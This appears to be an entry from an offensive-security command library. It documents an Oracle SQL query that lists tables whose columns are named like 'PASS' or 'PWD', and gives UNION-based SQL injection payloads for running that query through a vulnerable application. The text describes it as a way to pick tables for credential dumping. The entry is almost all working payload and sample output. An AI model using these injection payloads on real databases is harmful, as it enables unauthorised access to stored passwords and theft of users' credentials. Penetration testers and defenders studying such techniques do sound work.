---
id: cca6246d-3d68-4e9d-8239-5293174fb291
name: oracle-sql-list-password-columns
type: command
executor: sql
data: 'SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ''%PASS%'';'
output: null
created_at: '2023-04-06T03:56:35.238442+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Oracle Database
tags:
  - database-discovery
  - sql-injection
  - credential-access
verified: true
validated: true
---

# oracle-sql-list-password-columns

## Command

```sql
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
```

## Description

This SQL command scans the ALL_TAB_COLUMNS view for columns with 'PASS' in their name, targeting potential password fields in an Oracle database. Use in SQL injection to prioritize tables for credential dumping.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| '%PASS%' | Wildcard pattern for column names (LIKE clause) | Yes |

## Examples

### Basic Usage

```sql
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
```

Injection example: `' UNION SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'--`

### Advanced Usage

Broaden search: `' UNION SELECT owner, table_name, column_name FROM all_tab_columns WHERE column_name LIKE '%PWD%' OR column_name LIKE '%PASS%'--`

## Expected Output

Owner and table names with matching columns, e.g.:

OWNER     TABLE_NAME
--------  ----------
APP_USER  USERS
HR        EMPLOYEES

## Related

- [[procedures/Oracle-SQL-List-Tables-and-Columns]]
- [[commands/oracle-sql-list-tables-with-owner]]
